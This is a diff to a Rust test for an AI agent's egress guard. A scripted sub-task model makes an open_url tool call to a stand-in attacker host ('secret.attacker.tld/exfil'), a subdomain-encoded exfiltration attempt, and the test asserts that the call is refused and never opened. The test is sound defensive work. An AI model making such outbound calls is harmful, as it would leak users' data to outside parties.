@@ -11434,8 +11434,13 @@ mod tests {
         let (memory, tools, allowed) = loop_fixture("untrusted-egress");
         // The sub-task model immediately tries a subdomain-encoded outward GET; the
         // second scripted turn is the text it would speak after the refusal.
+        // TEST HYGIENE: the egress guard refuses ANY non-empty open_url on an
+        // untrusted call 0 REGARDLESS of scheme, so we deliberately use a scheme
+        // `normalize_url` rejects (ftp) — that way even if the guard ever regressed,
+        // dispatch would be refused by the scheme allowlist and NO `/usr/bin/open`
+        // could spawn. The refusal we assert is still the guard's own message.
         let script = vec![
-            tool_use_resp("t0", "open_url", json!({"url": "https://secret.attacker.tld"})),
+            tool_use_resp("t0", "open_url", json!({"url": "ftp://secret.attacker.tld/exfil"})),
             text_resp("acknowledged"),
         ];
         let brain = ScriptedBrain::new(script);
@@ -11459,7 +11464,7 @@ mod tests {
             "an untrusted call-0 open_url must be egress-refused: {transcript}"
         );
         assert!(
-            !transcript.contains("Opened https://"),
+            !transcript.contains("Opened "),
             "the actuator must never have opened the attacker URL: {transcript}"
         );
         assert!(
